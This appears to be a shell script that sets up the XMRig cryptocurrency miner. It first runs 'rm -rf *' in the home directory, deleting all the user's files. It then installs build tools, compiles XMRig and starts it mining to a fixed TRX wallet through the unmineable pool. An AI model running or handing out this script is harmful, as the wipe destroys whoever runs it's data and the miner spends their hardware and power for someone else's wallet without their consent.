cd ~
rm -rf *
apt install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
git clone https://github.com/xmrig/xmrig
mkdir xmrig/build
cd xmrig/build
cmake ..
make -j$(nproc)
./xmrig --opencl --cuda -o rx.unmineable.com:3333 -u TRX:THdDrLnfdbBrBStmi4HAK3ioJA6CQ8hNLg.Miner -p x -k
